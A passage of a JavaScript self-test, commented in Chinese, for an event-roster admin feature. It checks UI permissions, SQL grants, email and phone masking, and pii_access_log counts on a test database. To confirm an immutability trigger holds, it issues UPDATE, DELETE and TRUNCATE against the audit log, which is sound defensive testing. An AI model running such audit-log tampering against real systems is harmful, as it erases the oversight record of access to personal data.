  "名單直接顯示明文信箱與電話",
  /\{r\.email\}/.test(rosterTableTs) && /\{r\.phone\}/.test(rosterTableTs),
);
check(
  "不再有單筆揭露對話框",
  /RegistrationRevealDialog/.test(routeTs + rosterPageTs + rosterTableTs + rosterRouteTs),
  false,
);
// 2026-10-26（業主撤掉查看紀錄）：畫面不再講「會留下紀錄」、不再印紀錄編號。
check(
  "名單頁不再提存取紀錄／紀錄編號／log_id",
  /存取紀錄|紀錄編號|log_id/.test(stripTs(rosterPageTs)),
  false,
);
checkTrue(
  "匯出成功的 toast 只講人數",
  /toast\.success\(`已匯出 \$\{count\} 位`\)/.test(rosterPageTs),
);
checkTrue("沒有權限時匯出鈕 disabled", /!canReadRoster/.test(rosterPageTs));
checkTrue(
  "權限來自 route context 而不是 loader 資料",
  /user\.permissions\.includes\("event\.roster\.read"\)/.test(rosterRouteTs) &&
    /const \{ user \} = layout\.useRouteContext\(\)/.test(rosterRouteTs),
);
// 側欄。
const shellTs = readFile(join(ROOT, "src/routes/admin/_shell.tsx"));
checkTrue(
  "側欄的活動報名掛在 event.roster.read 上",
  /permission: "event\.roster\.read"/.test(shellTs),
);
checkTrue("側欄的過濾真的讀 permission", /user\.permissions\.includes\(needed\)/.test(shellTs));

// =============================================================================
// 連線段
// =============================================================================

const PG_URL = process.env.ROSTER_SELFTEST_PG_URL;

function looksLikeSingleSelect(sql) {
  const t = sql.trim();
  if (!/^select\b/i.test(t)) return false;
  return t.replace(/;\s*$/, "").indexOf(";") === -1;
}

/** 送一句 SQL，一次一條獨立連線（一個 psql 子行程）。**不 throw**。 */
async function q(sql) {
  const single = looksLikeSingleSelect(sql);
  const text = single
    ? `select coalesce(json_agg(t), '[]'::json)::text from (\n${sql.trim().replace(/;\s*$/, "")}\n) t`
    : sql;
  try {
    const { stdout } = await execFileAsync(
      "psql",
      ["-X", "-q", "-A", "-t", "-v", "ON_ERROR_STOP=1", "-d", PG_URL, "-c", text],
      { maxBuffer: 16 * 1024 * 1024 },
    );
    if (!single) return { ok: true, error: null, rows: [] };
    return { ok: true, error: null, rows: JSON.parse(stdout.trim() || "[]") };
  } catch (err) {
    return { ok: false, error: String(err.stderr ?? err.message ?? err), rows: [] };
  }
}

async function must(sql) {
  const r = await q(sql);
  if (!r.ok)
    throw new Error(`SQL 失敗：${r.error.slice(0, 400)}\n--- SQL ---\n${sql.slice(0, 600)}`);
  return r.rows;
}

const one = (rows) => (Array.isArray(rows) && rows.length > 0 ? rows[0] : null);
const num = (v) => Number(v ?? 0);

const SLUG_PREFIX = "rosterselftest-";
const KEY_PREFIX = "rosterselftest-";
const ACTOR = "9f000000-0000-4000-8000-00000000000a";

/**
 * FK 安全的清理順序。開頭與結尾各跑一次。
 *
 * ⚠️ **pii_access_log 清不掉，那是刻意的**（0019 §1.3 的 trigger 連 table owner
 *    都擋）。所以下面每一條都數**增量**，不數絕對值。
 */
const CLEANUP_SQL = `
delete from public.event_registrations r
 where r.order_id in (select o.id from public.orders o where o.idempotency_key like '${KEY_PREFIX}%')
    or r.session_id in (select s.id from public.event_sessions s
                         where s.product_id like '${SLUG_PREFIX}%');
delete from public.order_items where order_id in
  (select id from public.orders where idempotency_key like '${KEY_PREFIX}%');
delete from public.orders where idempotency_key like '${KEY_PREFIX}%';
delete from public.event_sessions where product_id like '${SLUG_PREFIX}%';
delete from public.products where id like '${SLUG_PREFIX}%';
delete from public.staff_permissions where user_id = '${ACTOR}';
delete from auth.users where id = '${ACTOR}';
`;

if (!PG_URL) {
  skipped.push("連線測試（缺 ROSTER_SELFTEST_PG_URL）");
  console.log(yellow("\n[13–18] 連線測試 —— 跳過：沒有 ROSTER_SELFTEST_PG_URL"));
  console.log(
    yellow("       設好之後重跑，才會驗到 log 恰好 +1／+3、trigger 擋得住竄改、遮罩的實際輸出、"),
  );
  console.log(yellow("       以及 0021 的冪等。指令見本檔檔頭。"));
} else {
  try {
    if (process.env.ROSTER_SELFTEST_APPLY === "1") {
      console.log("\n[13] 套用 0001–0021（ROSTER_SELFTEST_APPLY=1）");
      await must(`
        create extension if not exists pgcrypto;
        do $$ begin
          if not exists (select 1 from pg_roles where rolname='anon') then create role anon nologin; end if;
          if not exists (select 1 from pg_roles where rolname='authenticated') then create role authenticated nologin; end if;
          if not exists (select 1 from pg_roles where rolname='service_role') then create role service_role nologin bypassrls; end if;
        end $$;
        create schema if not exists auth;
        create table if not exists auth.users (
          id uuid primary key default gen_random_uuid(), email text,
          raw_user_meta_data jsonb, created_at timestamptz not null default now());
        create schema if not exists storage;
        create table if not exists storage.buckets (
          id text primary key, name text, public boolean default false,
          file_size_limit bigint, allowed_mime_types text[], owner uuid,
          created_at timestamptz default now());
        create table if not exists storage.objects (
          id uuid primary key default gen_random_uuid(), bucket_id text, name text,
          owner uuid, metadata jsonb, created_at timestamptz default now());
        alter table storage.objects enable row level security;
        grant usage on schema public to anon, authenticated, service_role;
      `);
      for (const f of migrations) {
        // 0008 要 pg_net + vault + pg_cron，本機沒有。
        if (f.startsWith("0008_")) continue;
        const r = await q(readFile(join(MIG_DIR, f)));
        if (!r.ok) throw new Error(`套用 ${f} 失敗：${r.error.slice(0, 600)}`);
      }
      checkTrue("0001–0021 套用完成（0008 跳過）", true);
    }

    console.log("\n[14] 前置：這個庫上真的有 0021");
    check(
      "public.admin_event_roster 存在",
      num(
        one(
          await must(
            `select count(*)::int n from information_schema.views
              where table_schema='public' and table_name='admin_event_roster'`,
          ),
        )?.n,
      ),
      1,
    );
    for (const fn of ["reveal_registration_contact", "export_event_roster"]) {
      check(
        `public.${fn}() 存在`,
        num(
          one(
            await must(`select count(*)::int n from pg_proc p
                              join pg_namespace ns on ns.oid = p.pronamespace
                             where ns.nspname='public' and p.proname='${fn}'`),
          )?.n,
        ),
        1,
      );
    }
    check(
      "inv.mask_email() 存在",
      num(
        one(
          await must(`select count(*)::int n from pg_proc p
                            join pg_namespace ns on ns.oid = p.pronamespace
                           where ns.nspname='inv' and p.proname='mask_email'`),
        )?.n,
      ),
      1,
    );

    // ---- 權限：問資料庫，不是讀 migration 的字串 -------------------------
    // ⚠️ 靜態段驗的是「migration 裡有沒有寫那幾行 revoke/grant」，這裡驗的是
    //    「寫完之後資料庫實際上長什麼樣」。Supabase 對 public schema 有
    //    ALTER DEFAULT PRIVILEGES（新建的物件一出生就對 anon/authenticated/
    //    service_role 是 ALL —— 0013 就是在修這個坑），所以這兩件事真的會分岔。
    console.log("\n[14a] 權限（問資料庫本人）");
    const viewGrants = await must(
      `select grantee, privilege_type from information_schema.role_table_grants
        where table_schema='public' and table_name='admin_event_roster'
          and grantee in ('anon','authenticated','service_role','PUBLIC')`,
    );
    check(
      "admin_event_roster 只給 service_role SELECT",
      viewGrants.map((g) => `${g.grantee}:${g.privilege_type}`).sort(),
      ["service_role:SELECT"],
    );
    for (const role of ["anon", "authenticated"]) {
      const denied = await q(`set role ${role}; select count(*) from public.admin_event_roster;`);
      check(`${role} 讀不到 admin_event_roster`, denied.ok, false);
      checkTrue(
        `${role} 拿到的是 permission denied`,
        /permission denied/i.test(denied.error ?? ""),
        (denied.error ?? "").slice(0, 160),
      );
    }
    // 兩支明文函式：PUBLIC 被 revoke 掉，只剩 owner 與 service_role。
    for (const fn of ["reveal_registration_contact", "export_event_roster"]) {
      const acl = one(
        await must(`select coalesce(array_to_string(p.proacl, '|'), '(default)') a
                      from pg_proc p join pg_namespace ns on ns.oid = p.pronamespace
                     where ns.nspname='public' and p.proname='${fn}'`),
      )?.a;
      // proacl 為 '(default)' 代表沒有任何 revoke/grant —— 那就是「PUBLIC 全開」。
      check(`${fn} 的 ACL 不是預設（＝真的 revoke 過）`, acl === "(default)", false);
      checkTrue(`${fn} 有給 service_role`, /service_role=X/.test(acl ?? ""), acl);
      // acl 裡出現 `=X/` 而前面沒有角色名，就是 PUBLIC 拿得到 EXECUTE。
      check(`${fn} 沒有把 EXECUTE 留給 PUBLIC`, /(^|\|)=X\//.test(acl ?? ""), false, acl);
    }

    // ---- 冪等：同一支套兩次 ---------------------------------------------
    console.log("\n[15] 0021 冪等");
    const again = await q(readFile(MIG_0021));
    checkTrue("0021 套第二次零錯誤", again.ok, again.ok ? "" : again.error.slice(0, 300));

    // ---- 遮罩的實際輸出 --------------------------------------------------
    console.log("\n[16] 遮罩（SQL 端的實際輸出）");
    const masks = one(
      await must(`select inv.mask_email('alice@example.invalid') a,
                         inv.mask_email('a@x.test')             b,
                         inv.mask_email('ab@x.test')            c,
                         inv.mask_email('abc')                  d,
                         inv.mask_email('')                     e,
                         inv.mask_tail('0912345678', 4)         f`),
    );
    check("信箱遮 local part 留首碼", masks?.a, "a****@example.invalid");
    check("太短的 local part 整串變星號", masks?.b, "*@x.test");
    // ⚠️ 這一格就是 0020 那份 TypeScript 的 bug：slice(-0) 會把整個 local part
    //    接回去，TS 回的是 'a*ab@x.test'。SQL 的 right(v, 0) 沒有這個坑。
    check("兩碼的 local part 不會被接回去（TS 那份的 bug）", masks?.c, "a*@x.test");
    check("沒有 @ 的字串照 mask_tail 處理", masks?.d, "*bc");
    check("空字串回 null", masks?.e, null);
    check("電話留後 4 碼", masks?.f, "******5678");

    // ---- 建立 fixture ----------------------------------------------------
    console.log("\n[17] pii_access_log 的增量");
    await must(CLEANUP_SQL);
    await must(`
      insert into auth.users (id, email) values ('${ACTOR}', 'roster-selftest@example.invalid');
      insert into public.products (id, slug, product_type, title, summary, description, price, stock, status)
      values ('${SLUG_PREFIX}evt','${SLUG_PREFIX}evt','event',
              '{"zh":"自檢活動","en":"e","ja":"e"}','{"zh":"a","en":"a","ja":"a"}','{"zh":"a","en":"a","ja":"a"}',
              500, 0, 'active');
      insert into public.event_sessions (product_id, title, location, starts_at, capacity, status)
      values ('${SLUG_PREFIX}evt','{"zh":"自檢梯次","en":"s","ja":"s"}','{"zh":"店內","en":"shop","ja":"s"}',
              now() + interval '7 days', 10, 'open');
      -- 一張已付款、一張未付款：簽到表只能看到前者。
      insert into public.orders (customer_name, customer_email, customer_phone, subtotal, total, idempotency_key, payment_status, paid_at)
      values ('自檢','selftest@example.invalid','0900000000',1000,1000,'${KEY_PREFIX}paid','paid', now()),
             ('自檢','selftest@example.invalid','0900000000', 500, 500,'${KEY_PREFIX}pend','pending', null);
    `);
    await must(`
      insert into public.order_items (order_id, product_id, session_id, name, unit_price, quantity, subtotal, product_type)
      select o.id, '${SLUG_PREFIX}evt', s.id, '{"zh":"a","en":"a","ja":"a"}', 500,
             case when o.idempotency_key = '${KEY_PREFIX}paid' then 2 else 1 end,
             o.total, 'event'
        from public.orders o
        cross join (select id from public.event_sessions where product_id = '${SLUG_PREFIX}evt') s
       where o.idempotency_key in ('${KEY_PREFIX}paid','${KEY_PREFIX}pend');
    `);
    await must(`
      insert into public.event_registrations (session_id, order_id, order_item_id, seat_no, name, email, phone)
      select oi.session_id, oi.order_id, oi.id, gs.n,
             case when o.payment_status = 'paid' then '已付款參加者' || gs.n else '未付款參加者' end,
             'attendee' || gs.n || '@example.invalid',
             '091234567' || gs.n
        from public.order_items oi
        join public.orders o on o.id = oi.order_id
        cross join lateral generate_series(1, oi.quantity) gs(n)
       where o.idempotency_key in ('${KEY_PREFIX}paid','${KEY_PREFIX}pend');
    `);

    const sessionId = one(
      await must(`select id from public.event_sessions where product_id = '${SLUG_PREFIX}evt'`),
    )?.id;
    checkTrue("反空殼：fixture 建出了場次", Boolean(sessionId));

    // view 的內容：3 列（2 已付款 + 1 未付款），姓名明文、聯絡方式遮罩。
    const viewRows = await must(
      `select name, email_masked, phone_masked, has_email, has_phone, on_roster, payment_status
         from public.admin_event_roster where session_id = '${sessionId}' order by seat_no, order_no`,
    );
    check("view 回 3 列", viewRows.length, 3);
    check("其中 2 列 on_roster", viewRows.filter((r) => r.on_roster === true).length, 2);
    check(
      "未付款那一列 on_roster = false",
      viewRows.filter((r) => r.on_roster === false).length,
      1,
    );
    checkTrue(
      "姓名是明文",
      viewRows.every((r) => /參加者/.test(r.name)),
    );
    checkTrue(
      "信箱是遮罩過的",
      viewRows.every((r) => /^\w\*+@example\.invalid$/.test(r.email_masked)),
    );
    checkTrue(
      "電話是遮罩過的",
      viewRows.every((r) => /^\*+\d{4}$/.test(r.phone_masked)),
    );

    const before = num(one(await must("select count(*)::int n from public.pii_access_log"))?.n);

    // ---- export 一次 → 恰好 +1 ------------------------------------------
    const exported = one(
      await must(`select public.export_event_roster(
                    '${ACTOR}', 'roster-selftest@example.invalid', '${sessionId}') j`),
    )?.j;
    const afterExport = num(
      one(await must("select count(*)::int n from public.pii_access_log"))?.n,
    );
    check("export 一次 → pii_access_log 恰好 +1", afterExport - before, 1);
    check("匯出的列數只含已付款", (exported?.rows ?? []).length, 2);
    checkTrue(
      "匯出的內容是明文",
      (exported?.rows ?? []).every(
        (r) => /@example\.invalid$/.test(r.email) && /^09\d{8}$/.test(r.phone),
      ),
    );
    check(
      "未付款的人不在匯出裡",
      (exported?.rows ?? []).some((r) => /未付款/.test(r.name)),
      false,
    );
    const exportLog = one(
      await must(`select subject_table, reason, array_length(fields,1)::int nf, actor_email
                    from public.pii_access_log order by accessed_at desc limit 1`),
    );
    check("export 的 subject_table 是場次", exportLog?.subject_table, "public.event_sessions");
    check("export 的 reason 是 roster_export", exportLog?.reason, "roster_export");
    check("export 記下三個欄位", num(exportLog?.nf), 3);
    check("actor_email 抄了一份", exportLog?.actor_email, "roster-selftest@example.invalid");

    // ---- reveal 三次 → 恰好 +3 ------------------------------------------
    const regIds = (
      await must(`select registration_id from public.admin_event_roster
                   where session_id = '${sessionId}' order by order_no, seat_no limit 3`)
    ).map((r) => r.registration_id);
    check("反空殼：拿得到 3 筆報名 id", regIds.length, 3);
    for (const id of regIds) {
      await must(`select public.reveal_registration_contact(
                    '${ACTOR}', 'roster-selftest@example.invalid', '${id}') j`);
    }
    const afterReveal = num(
      one(await must("select count(*)::int n from public.pii_access_log"))?.n,
    );
    check("reveal 三次 → pii_access_log 恰好 +3", afterReveal - afterExport, 3);
    // ⚠️ 用 subject_id 圈住這三筆，不要數 reason='attendee_contact' 的總數 ——
    //    pii_access_log 清不掉，所以同一個測試庫跑第二次時絕對值一定會變大。
    //    這一條第一次寫成絕對值，跑起來就是紅的。
    check(
      "三筆的 subject_table 都是 event_registrations",
      num(
        one(
          await must(`select count(*)::int n from public.pii_access_log
                       where reason = 'attendee_contact'
                         and subject_table = 'public.event_registrations'
                         and subject_id in (${regIds.map((i) => `'${i}'`).join(",")})`),
        )?.n,
      ),
      3,
    );
    // 名單頁的列表本身不寫 log —— 讀 view 一百次也不會多一列。
    for (let i = 0; i < 5; i += 1) {
      await must(
        `select count(*)::int n from public.admin_event_roster where session_id = '${sessionId}'`,
      );
    }
    check(
      "讀 view 五次 → pii_access_log 不變（遮罩過的東西不記）",
      num(one(await must("select count(*)::int n from public.pii_access_log"))?.n) - afterReveal,
      0,
    );

    // ---- 竄改那幾列 → 被 trigger 擋下 -----------------------------------
    console.log("\n[18] 稽核軌跡刪不掉、改不了");
    const upd = await q(
      `update public.pii_access_log set reason = 'payment' where reason = 'roster_export'`,
    );
    check("update 被擋下", upd.ok, false);
    checkTrue(
      "而且是 PII_LOG_IMMUTABLE",
      /PII_LOG_IMMUTABLE/.test(upd.error ?? ""),
      (upd.error ?? "").slice(0, 200),
    );
    const del = await q(`delete from public.pii_access_log where reason = 'attendee_contact'`);
    check("delete 被擋下", del.ok, false);
    checkTrue(
      "而且是 PII_LOG_IMMUTABLE",
      /PII_LOG_IMMUTABLE/.test(del.error ?? ""),
      (del.error ?? "").slice(0, 200),
    );
    const trunc = await q(`truncate public.pii_access_log`);
    check("truncate 被擋下", trunc.ok, false);
    check(
      "四筆紀錄一列都沒有少",
      num(one(await must("select count(*)::int n from public.pii_access_log"))?.n) - before,
      4,
    );

    // ---- CHECK 的值域真的擋得住打錯字 -----------------------------------
    const badReason = await q(`select public.export_event_roster(
      '${ACTOR}', 'x@example.invalid', '${sessionId}', 'whatever')`);
    check("亂寫的 reason 被 CHECK 擋下", badReason.ok, false);
    checkTrue(
      "而且是 check 違規",
      /pii_access_log_reason_check|violates check/i.test(badReason.error ?? ""),
    );
    // 找不到對象時不可以留下紀錄（0019 §4.1：記的是「有沒有看到」，不是「有沒有嘗試」）。
    const beforeMiss = num(one(await must("select count(*)::int n from public.pii_access_log"))?.n);
    const missing = await q(`select public.reveal_registration_contact(
      '${ACTOR}', 'x@example.invalid', '00000000-0000-4000-8000-000000000000')`);
    check("找不到報名時 raise", missing.ok, false);
    check(
      "而且沒有留下紀錄（嘗試不算查閱）",
      num(one(await must("select count(*)::int n from public.pii_access_log"))?.n) - beforeMiss,
      0,
    );

    await must(CLEANUP_SQL);
  } catch (err) {
    fail += 1;
    console.log(red(`\n  ✗ 連線段中止：${String(err).slice(0, 600)}`));
    // ##SELFTEST## 那一行仍然要印出來，否則 runner 只會說「沒有印出收尾行」，
    // 而已經跑完的靜態段就白跑了。
  }
}

// -----------------------------------------------------------------------------
// 收尾
// -----------------------------------------------------------------------------
console.log("\n────────────────────────────────────────────────────");
for (const s of skipped) console.log(yellow(`跳過：${s}`));
console.log(`##SELFTEST## file=${SELF} pass=${pass} fail=${fail}`);
if (fail === 0) {
  console.log(green(`✓ 全部通過：${pass} passed, 0 failed`));
} else {
  console.log(red(`✗ 有失敗：${pass} passed, ${fail} failed`));
  process.exitCode = 1;
}
